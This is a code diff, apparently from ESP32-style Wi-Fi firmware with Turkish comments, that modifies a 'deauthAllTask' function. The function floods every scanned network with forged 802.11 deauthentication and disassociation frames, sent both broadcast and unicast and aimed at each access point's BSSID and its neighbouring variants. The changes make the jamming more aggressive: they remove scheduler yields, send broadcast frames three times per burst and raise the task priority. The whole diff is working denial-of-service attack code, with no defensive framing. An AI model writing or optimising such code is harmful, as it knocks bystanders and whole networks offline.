@@ -874,18 +874,26 @@ void deauthAllTask(void *param) {
       wifi_set_channel(net.channel);
       vTaskDelay(pdMS_TO_TICKS(DA_CH_SWITCH_MS)); // kanal stabilizasyon için minimum bekleme
 
-      // ── Ana burst: broadcast + unicast deauth/disassoc ──────────────────────
-      // Per-frame delay yok — safeSendMgnt sadece SKB hata varsa 5ms bekler
-      for (int burst = 0; burst < frameCount; burst++) {
-        for (int offset = -1; offset <= 1; offset++) {
-          uint8_t temp[6];
-          memcpy(temp, net.bssid, 6);
-          temp[5] = (uint8_t)(temp[5] + offset);
-          if (isFakeAPBSSID(temp)) continue;
+      // ── BSSID varyantlarını burst öncesi hesapla — iç döngüde isFakeAP çağrısı yok
+      uint8_t variants[3][6];
+      int vcount = 0;
+      for (int off = -1; off <= 1; off++) {
+        uint8_t tmp[6];
+        memcpy(tmp, net.bssid, 6);
+        tmp[5] = (uint8_t)(tmp[5] + (uint8_t)off);
+        if (!isFakeAPBSSID(tmp)) {
+          memcpy(variants[vcount++], tmp, 6);
+        }
+      }
+      if (vcount == 0) continue;
 
+      // ── Ana burst: broadcast + unicast deauth/disassoc — taskYIELD YOK ──────
+      // taskYIELD kaldırıldı: her yield WiFi stack'e 10-50ms veriyor
+      for (int burst = 0; burst < frameCount; burst++) {
+        for (int v = 0; v < vcount; v++) {
           // Broadcast deauth (reason 7)
-          memcpy(&frame[10], temp, 6);
-          memcpy(&frame[16], temp, 6);
+          memcpy(&frame[10], variants[v], 6);
+          memcpy(&frame[16], variants[v], 6);
           memset(&frame[4], 0xFF, 6);
           frame[0] = 0xC0; frame[24] = 0x07;
           safeSendMgnt(frame, 26);
@@ -894,8 +902,8 @@ void deauthAllTask(void *param) {
           frame[24] = 0x02;
           safeSendMgnt(frame, 26);
 
-          // Unicast deauth — AP BSSID hedefli
-          memcpy(&frame[4], temp, 6);
+          // Unicast deauth
+          memcpy(&frame[4], variants[v], 6);
           frame[0] = 0xC0; frame[24] = 0x07;
           safeSendMgnt(frame, 26);
 
@@ -903,19 +911,18 @@ void deauthAllTask(void *param) {
           frame[0] = 0xA0; frame[24] = 0x07;
           safeSendMgnt(frame, 26);
         }
-        // Burst arası delay YOK — taskYIELD ile scheduler'a kısa yol ver
-        taskYIELD();
+        // taskYIELD() YOK — CPU'yu bırakmadan devam et
       }
 
-      // ── Ek broadcast burst — broadcast deauth çift gönder ──────────────────
+      // ── Ek broadcast burst — sadece broadcast deauth, hızlı ve yoğun ─────────
+      memcpy(&frame[10], net.bssid, 6);
+      memcpy(&frame[16], net.bssid, 6);
+      memset(&frame[4], 0xFF, 6);
+      frame[0] = 0xC0; frame[24] = 0x07;
       for (int extra = 0; extra < extraBurst; extra++) {
-        memcpy(&frame[10], net.bssid, 6);
-        memcpy(&frame[16], net.bssid, 6);
-        memset(&frame[4], 0xFF, 6);
-        frame[0] = 0xC0; frame[24] = 0x07;
         safeSendMgnt(frame, 26);
         safeSendMgnt(frame, 26);
-        taskYIELD();
+        safeSendMgnt(frame, 26); // 3× gönder — backoff yoksa çok hızlı
       }
 
     }
@@ -1458,7 +1465,7 @@ void handleClient(WiFiClient &client) {
       } else {
         if (scan_status != SCAN_RUNNING && networks.size() > 0) {
           deauth_all_active = true;
-          xTaskCreate(deauthAllTask, "dauth_all", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
+          xTaskCreate(deauthAllTask, "dauth_all", 4096, NULL, tskIDLE_PRIORITY + 3, NULL);
         }
       }
       sendStartPage(client);
